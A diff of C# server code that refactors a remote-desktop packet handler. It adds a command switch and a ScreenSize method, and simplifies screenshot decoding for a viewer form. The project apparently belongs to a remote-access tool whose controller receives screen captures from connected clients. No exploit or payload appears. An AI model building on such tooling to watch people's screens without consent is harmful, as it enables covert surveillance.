@@ -12,6 +12,44 @@ namespace Server.Handle_Packet
 {
     public class HandleRemoteDesktop
     {
+        public HandleRemoteDesktop(Clients client, MsgPack unpack_msgpack)
+        {
+            switch (unpack_msgpack.ForcePathObject("Command").AsString)
+            {
+                case "screens":
+                    {
+                        Debug.WriteLine("I got the screen size");
+                        ScreenSize(client, unpack_msgpack);
+                        break;
+                    }
+
+                case "capture":
+                    {
+                        Capture(client, unpack_msgpack);
+                        break;
+                    }
+            }
+        }
+
+        public void ScreenSize(Clients client, MsgPack unpack_msgpack)
+        {
+            FormRemoteDesktop RD = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
+            try
+            {
+                if (RD.Client == null)
+                {
+                    RD.Client = client;
+                    int Screens = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
+                    RD.numericUpDown2.Maximum = Screens - 1;
+                    RD.labelWait.Visible = false;
+                    RD.timer1.Start();
+                    RD.button1.Enabled = true;
+                    RD.button1.Tag = (object)"play";
+                    RD.button1.PerformClick();
+                }
+            }
+           catch { }
+        }
         public void Capture(Clients client, MsgPack unpack_msgpack)
         {
             try
@@ -21,20 +59,8 @@ namespace Server.Handle_Packet
                 {
                     if (RD != null)
                     {
-                        if (RD.Client == null)
-                        {
-                            RD.Client = client;
-                            RD.timer1.Start();
-                            byte[] RdpStream0 = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
-                            Bitmap decoded0 = RD.decoder.DecodeData(new MemoryStream(RdpStream0));
-                            RD.rdSize = decoded0.Size;
-                            RD.labelWait.Visible = false;
-                        }
                         byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                         Bitmap decoded = RD.decoder.DecodeData(new MemoryStream(RdpStream));
-
-                        int Screens = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
-                        RD.numericUpDown2.Maximum = Screens - 1;
 
                         if (RD.RenderSW.ElapsedMilliseconds >= (1000 / 20))
                         {
